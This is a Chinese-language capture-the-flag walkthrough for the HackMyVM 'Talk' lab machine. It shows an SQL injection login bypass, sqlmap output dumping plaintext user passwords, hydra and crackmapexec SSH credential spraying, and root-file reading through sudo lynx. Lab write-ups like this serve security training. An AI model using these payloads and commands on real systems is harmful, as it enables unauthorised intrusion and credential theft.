# Talk

2024-11-09 https://hackmyvm.eu/machines/machine.php?vm=Talk

## IP

192.168.5.40

## Scan

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

访问首页是个登陆框 http://192.168.5.40/home.php ，尝试是否存在 SQL 注入，发现存在，username 和 passwd 都输入：

```
1' or 1=1 -- -
```

直接使用 sqlmap 跑数据库：

```
available databases [4]:
[*] chat
[*] information_schema
[*] mysql
[*] performance_schema
```

直接获得 chat 中的用户数据表 user：

```
+--------+-----------------+-------------+-----------------+----------+-----------+
| userid | email           | phone       | password        | username | your_name |
+--------+-----------------+-------------+-----------------+----------+-----------+
| 5      | david@david.com | 11          | adrianthebest   | david    | david     |
| 4      | jerry@jerry.com | 111         | thatsmynonapass | jerry    | jerry     |
| 2      | nona@nona.com   | 1111        | myfriendtom     | nona     | nona      |
| 1      | pao@yahoo.com   | 09123123123 | pao             | pao      | PaoPao    |
| 3      | tina@tina.com   | 11111       | davidwhatpass   | tina     | tina      |
+--------+-----------------+-------------+-----------------+----------+-----------+
```

收集 username 和 password 列的值，使用 hydra 或 crackmapexec 进行全集 ssh 碰撞登陆，发现 3 个可以登陆的账户：

```
sudo crackmapexec -t 10 ssh 192.168.5.40 -u user -p passwd --continue-on-success
或
hydra -t 20 -L user -P passwd ssh://192.168.5.40 -V

[22][ssh] host: 192.168.5.40   login: nona   password: thatsmynonapass
[22][ssh] host: 192.168.5.40   login: david   password: davidwhatpass
[22][ssh] host: 192.168.5.40   login: jerry   password: myfriendtom
```

尝试登陆这 3 个账户，只有 nona:thatsmynonapass 中有提权的路径，先读取 user flag：

```
nona@talk:~$ cat user.txt
wordsarelies
```

sudo -l 发现：

```
(ALL : ALL) NOPASSWD: /usr/bin/lynx
```

lynx 是一个字符界面的全功能 www 浏览器, 可以使用 file 协议直接读取 root 目录中的 root flag：

```
sudo /usr/bin/lynx file:///root/root.txt

talktomeroot
```
